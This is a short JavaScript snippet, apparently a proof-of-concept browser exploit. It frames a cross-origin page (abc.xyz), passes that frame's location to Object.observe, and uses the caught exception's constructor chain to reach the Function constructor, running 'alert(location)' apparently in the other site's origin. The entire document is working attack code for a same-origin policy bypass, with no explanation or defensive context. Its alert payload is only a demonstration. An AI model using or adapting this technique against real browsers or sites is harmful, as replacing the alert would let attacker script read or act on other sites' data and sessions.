var i = document.documentElement.appendChild(document.createElement('iframe'));
i.onload = function() {
  try {
    Object.observe(frames[0].location, Map, 0);
  } catch(e) {
    e.constructor.constructor('alert(location)')();
  }
}
i.src = 'https://abc.xyz';